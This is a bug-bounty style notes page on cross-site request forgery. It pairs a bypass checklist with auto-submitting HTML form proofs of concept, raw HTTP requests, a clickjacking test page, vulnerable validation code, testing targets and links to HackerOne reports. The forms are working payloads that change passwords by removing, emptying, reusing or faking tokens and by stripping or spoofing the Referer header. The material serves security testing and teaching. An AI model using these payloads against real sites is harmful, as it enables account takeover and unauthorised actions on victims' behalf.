---
description: 'CWE-352: Cross-Site Request Forgery (CSRF)'
---

# CSRF

### What it is ??

Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.

CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP

## Methodology

![image](https://github.com/h0tak88r/Web\_Penetration\_Testing\_Notes/assets/108616378/f32ef6f7-cf71-4fbb-a95b-c598a20e2199)

## **CSRF** Bypass

* [ ] **CSRF Bypasses**
  *   **ClickJacking**

      ```html
      <html>
       <head>
       <title>Clickjack test page</title>
       </head>
       <body>
       <p>This page is vulnerable to clickjacking if the iframe is not blank!</p>
       <iframe src="PAGE_URL" width="500" height="500"></iframe>
       </body>
      </html>
      ```
  *   **Change Request Method**

      ```http
      # Request
      POST /password_change
      Host: email.example.com
      Cookie: session_cookie=YOUR_SESSION_COOKIE
      (POST request body)
      new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
      --------------------------------------------

      # Bypass
      GET /password_change?new_password=abc123
      Host: email.example.com
      Cookie: session_cookie=YOUR_SESSION_COOKIE
      ```
  *   **Bypass CSRF Tokens stored on the server**

      ```html
      # remove the token
      POST /password_change
      Host: email.example.com
      Cookie: session_cookie=YOUR_SESSION_COOKIE
      (POST request body)
      new_password=abc123
      -------------------------------------------------------------
      <html>
       <form method="POST" action="<https://email.example.com/password_change>" id="csrf-form">
       <input type="text" name="new_password" value="abc123">
       <input type='submit' value="Submit">
       </form>
       <script>document.getElementById("csrf-form").submit();</script>
      </html>
      ----------------------------------------------------------------
      # Empty Parameter
      POST /password_change
      Host: email.example.com
      Cookie: session_cookie=YOUR_SESSION_COOKIE
      (POST request body)
      new_password=abc123&csrf_token=
      ---------------------------------------------------------------------
      <html>
       <form method="POST" action="<https://email.example.com/password_change>" id"csrf-form">
       <input type="text" name="new_password" value="abc123">
       <input type="text" name="csrf_token" value="">
       <input type='submit' value="Submit">
      </form>
       <script>document.getElementById("csrf-form").submit();</script>
      </html>
      --------------------------
      # Expected Code
      def validate_token():
       if (request.csrf_token == session.csrf_token):
      		 pass
       else:
      	 throw_error("CSRF token incorrect. Request rejected.")
      [...]
      def process_state_changing_action():
      	 if request.csrf_token:
      		 validate_token()
      		 execute_action()
      ```
  *   **Weak Token Integriti ( Reuse token )**

      ```html
      POST /password_change
      Host: email.example.com
      Cookie: session_cookie=YOUR_SESSION_COOKIE
      (POST request body)
      new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
      ----------------------------------
      <html>
       <form method="POST" action="<https://email.example.com/password_change>" id"csrf-form">
       <input type="text" name="new_password" value="abc123">
       <input type="text" name="csrf_token" value="871caef0757a4ac9691aceb9aad8b65b ">
       <input type='submit' value="Submit">
      </form>
       <script>document.getElementById("csrf-form").submit();</script>
      </html>
      --------------------------------------------------------------
      ## Expected Code
      def validate_token():
       if request.csrf_token:
      	 if (request.csrf_token in valid_csrf_tokens):
      			 pass
      	 else:
      		 throw_error("CSRF token incorrect. Request rejected.")
      [...]
      def process_state_changing_action():
       	 validate_token()
      	 execute_action()
      ------------------------------------------------------------------------
      # Exploit 
      If the token is fixed value for the account then change the email to victim's email and make CSRF poc
      with the old CSRF token from old requests
      ```
  *   **Bypass Double submit CSRF tokens**

      ```python
      # Valid 
      POST /password_change
      Host: email.example.com
      Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b
      (POST request body)
      new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
      --------------------------
      # Invalid
      POST /password_change
      Host: email.example.com
      Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=1aceb9aad8b65b871caef0757a4ac969
      (POST request body)
      new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
      ---------------------------------------
      # Bypass 
      POST /password_change
      Host: email.example.com
      Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=not_a_real_token
      (POST request body)
      new_password=abc123&csrf_token=not_a_real_token
      ```
  *   **Bypass CSRF Referer Header Check**

      ```python
      # Just Remove The referrer
      <html>
       <meta name="referrer" content="no-referrer">
       <form method="POST" action="<https://email.example.com/password_change>" id="csrf-form">
       <input type="text" name="new_password" value="abc123">
       <input type='submit' value="Submit">
       </form>
       <script>document.getElementById("csrf-form").submit();</script>
      </html>
      --------------------
      # Expected Code
      def validate_referer():
       if (request.referer in allowlisted_domains):
      pass
       else:
       throw_error("Referer incorrect. Request rejected.")
      [...]
      def process_state_changing_action():
       if request.referer:
       validate_referer()
       execute_action()
      ---------------------------
      # another way
      POST /password_change
      Host: email.example.com
      Cookie: session_cookie=YOUR_SESSION_COOKIE;
      Referer: example.com.attacker.com
      (POST request body)
      new_password=abc123
      ------------------
      # Vulnerable code
      def validate_referer():
       if request.referer:
       if ("example.com" in request.referer):
       pass
       else:
       throw_error("Referer incorrect. Request rejected.")
      [...]
      def process_state_changing_action():
       validate_referer()
       execute_action()
      ```
  *   **Bypass CSRF Protection by Using XSS**

      Steal victim CSRF Token Via XSS Vulnerability
  * **Replace the token with unreal token but with the same length**
  * **Bypass using subdomain takeover + CORS ==** [**CSRF**](https://monish-basaniwal.medium.com/how-i-found-my-first-subdomain-takeover-vulnerability-b7d5c17b61fd)&#x20;
  * **Crsf protection by Referrer Header? Remove the header \[ADD in form ]**
  * **Try to decrypt the hash (maybe CSRF is a hash)**
  * **Analyze Token(use burp)**
    * Sometimes Anti-CSRF token is composed of two parts, one of them remains static while the other one is dynamic."`837456mzy29jkd911139`" for one request the other time "`837456mzy29jkd337221`" if you notice, "`837456mzy29jkd`" part of the token remains same, send the request with only the static part
  * **Sometimes the anti-csrf check is dependent on User-Agent as well.**
    * If you try to use a mobile/tablet user agent, the application may not even check for an anti-csrf token.
* [ ] Where To Find
  1. **Authentication-Required Actions**: Look for actions that require authentication, such as changing account settings, updating passwords, or making transactions. These are common areas where CSRF vulnerabilities can have significant impact.
  2. **User Profile Changes**: Check for actions related to user profile changes, such as updating email addresses, changing personal information, or modifying profile pictures.
  3. **Account Deletion or Suspension**: Actions that allow a user to delete or suspend their account could be targets for CSRF attacks.
  4. **Payment and Transactional Actions**: Look for payment-related actions like making transactions, adding payment methods, or modifying subscription plans.
  5. **Form Submissions**: Any action that involves form submissions could potentially be a target. This includes actions like submitting support tickets, submitting feedback, or submitting any kind of content.
  6. **CSRF Tokens**: Some applications use CSRF tokens as a mitigation technique. Look for instances where CSRF tokens are missing or improperly validated. You might find CSRF tokens in hidden fields within HTML forms or as headers in AJAX requests.
  7. **Third-Party Integrations**: If the application integrates with third-party services or APIs, check if these integrations are susceptible to CSRF attacks.
  8. **Changing Security Settings**: Actions related to changing security settings, like enabling two-factor authentication (2FA) or changing security questions, can also be targets.
  9. **Privilege Escalation**: Actions that involve escalating user privileges, such as changing a user's role or permissions, should be thoroughly tested for CSRF vulnerabilities.
  10. **Logging Out**: Even the logout functionality can be exploited through CSRF attacks, forcing a victim to unknowingly log out.
  11. **Password Reset**: If the password reset process doesn't include proper CSRF protections, an attacker could potentially change a user's password without their consent.
  12. **test login, logout, reset pass, change password, add-cart, like, comment, profile change, user details change, balance transfer, subscription, etc**

### Write-ups

* [How a simple CSRF attack turned into a P1](https://ladysecspeare.wordpress.com/2020/04/05/how-a-simple-csrf-attack-turned-into-a-p1-level-bug/)
* [How I exploited the json csrf with method override technique](https://medium.com/@secureITmania/how-i-exploit-the-json-csrf-with-method-override-technique-71c0a9a7f3b0)
* [How I found CSRF(my first bounty)](https://medium.com/@rajeshranjan457/how-i-csrfd-my-first-bounty-a62b593d3f4d)
* [Exploiting websocket application wide XSS and CSRF](https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa)
* [Site wide CSRF on popular program](https://fellchase.blogspot.com/2020/02/site-wide-csrf-on-popular-program.html)
* [Using CSRF I got weird account takeover](https://flex0geek.blogspot.com/2020/02/using-csrf-i-got-weird-account-takeover.html)
* [CSRF CSRF CSRF](https://medium.com/@navne3t/csrf-csrf-csrf-f203e6452a9c)
* [Google Bugbounty CSRF in learndigital.withgoogle.com](https://santuysec.com/2020/01/21/google-bug-bounty-csrf-in-learndigital-withgoogle-com/)
* [CSRF token bypass \[a tale of 2k bug\]](https://medium.com/@sainttobs/csrf-token-bypasss-a-tale-of-my-2k-bug-ff7f51166ea1)
* [2FA bypass via CSRF attack](https://medium.com/@vbharad/2-fa-bypass-via-csrf-attack-8f2f6a6e3871)
* [Stored iframe injection CSRF account takeover](https://medium.com/@irounakdhadiwal999/stored-iframe-injection-csrf-account-takeover-42c93ad13f5d)
* [Instagram delete media CSRF](https://blog.darabi.me/2019/12/instagram-delete-media-csrf.html)
* [An inconsistent CSRF](https://smaranchand.com.np/2019/10/an-inconsistent-csrf/)
* [Bypass CSRF with clickjacking worth 1250](https://medium.com/@saadahmedx/bypass-csrf-with-clickjacking-worth-1250-6c70cc263f40)
* [Sitewide CSRF graphql](https://rafiem.github.io/bugbounty/tokopedia/site-wide-csrf-graphql/)
* [Account takeover using CSRF json based](https://medium.com/@shub66452/account-takeover-using-csrf-json-based-a0e6efd1bffc)
* [CORS to CSRF attack](https://medium.com/@osamaavvan/cors-to-csrf-attack-c33a595d441)
* [My first CSRF to account takeover](https://medium.com/@nishantrustlingup/my-first-csrf-to-account-takeover-worth-750-1332641d4304)
* [4x chained CSRFs chained for account takeover](https://medium.com/a-bugz-life/4x-csrfs-chained-for-company-account-takeover-f9fada416986)

### Reports

1. [CSRF on connecting Paypal as Payment Provider](https://hackerone.com/reports/807924) to Shopify - 287 upvotes, $500
2. [Account Takeover using Linked Accounts due to lack of CSRF protection](https://hackerone.com/reports/463330) to Rockstar Games - 227 upvotes, $1000
3. [Periscope android app deeplink leads to CSRF in follow action](https://hackerone.com/reports/583987) to Twitter - 204 upvotes, $1540
4. [Chaining Bugs: Leakage of CSRF token which leads to Stored XSS and Account Takeover (xs1.tribalwars.cash)](https://hackerone.com/reports/604120) to InnoGames - 186 upvotes, $1100
5. [Site wide CSRF affecting both job seeker and Employer account on glassdoor.com](https://hackerone.com/reports/790061) to Glassdoor - 152 upvotes, $3000
6. [CSRF leads to a stored self xss](https://hackerone.com/reports/323005) to Imgur - 141 upvotes, $500
7. [CSRF protection bypass in GitHub Enterprise management console](https://hackerone.com/reports/1497169) to GitHub - 138 upvotes, $10000
8. [Slack integration setup lacks CSRF protection](https://hackerone.com/reports/170552) to HackerOne - 134 upvotes, $2500
9. [Lack of CSRF header validation at https://g-mail.grammarly.com/profile](https://hackerone.com/reports/629892) to Grammarly - 129 upvotes, $750
10. [CSRF token validation system is disabled on Stripe Dashboard](https://hackerone.com/reports/1483327) to Stripe - 105 upvotes, $2500
11. [Cross-Site Request Forgery (CSRF) vulnerability on API endpoint allows account takeovers](https://hackerone.com/reports/419891) to Khan Academy - 101 upvotes, $0
12. [CSRF Vulnerability on https://signin.rockstargames.com/tpa/facebook/link/](https://hackerone.com/reports/474833) to Rockstar Games - 98 upvotes, $1000
13. [CSRF to HTML Injection in Comments](https://hackerone.com/reports/428019) to WordPress - 94 upvotes, $950
14. [One Click Account takeover using Ouath CSRF bypass by adding Null byte %00 in state parameter on www.streamlabs.com](https://hackerone.com/reports/1046630) to Logitech - 85 upvotes, $200
15. [CSRF in Account Deletion feature (https://www.flickr.com/account/delete)](https://hackerone.com/reports/615448) to Flickr - 82 upvotes, $750
16. [Account takeover at https://try.discourse.org due to no CSRF protection in connecting Yahoo account](https://hackerone.com/reports/423022) to Discourse - 81 upvotes, $512
17. [CSRF token validation system is disabled on Stripe Dashboard](https://hackerone.com/reports/1493437) to Stripe - 80 upvotes, $2500
18. [\[CRITICAL\] Full account takeover using CSRF](https://hackerone.com/reports/235642) to Twitter - 79 upvotes, $5040
19. [CSRF Account Takeover](https://hackerone.com/reports/1253462) to TikTok - 78 upvotes, $2373
